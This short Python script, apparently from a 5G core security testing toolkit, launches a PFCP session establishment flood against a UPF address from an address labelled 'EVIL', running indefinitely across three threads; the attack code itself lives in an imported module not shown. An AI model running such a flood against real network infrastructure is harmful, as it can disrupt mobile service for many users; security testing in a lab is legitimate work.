import os, sys

sys.path.insert(0, os.path.abspath(os.path.join(os.path.dirname(__file__), "..")))


from src.attacks.pfcp.pfcpDosAttack import PFCPDosAttack
from src import ip_list

# from src import ip_list

pfcpdosobj = PFCPDosAttack()
pfcpdosobj.start_pfcp_session_establishment_flood(
    evil_addr=ip_list["EVIL"],
    upf_addr=ip_list["UPF"],
    reqNbr=1000,
    random_far_number=24,
    verbose=True,
    infinite=True,
    num_threads=3,
)
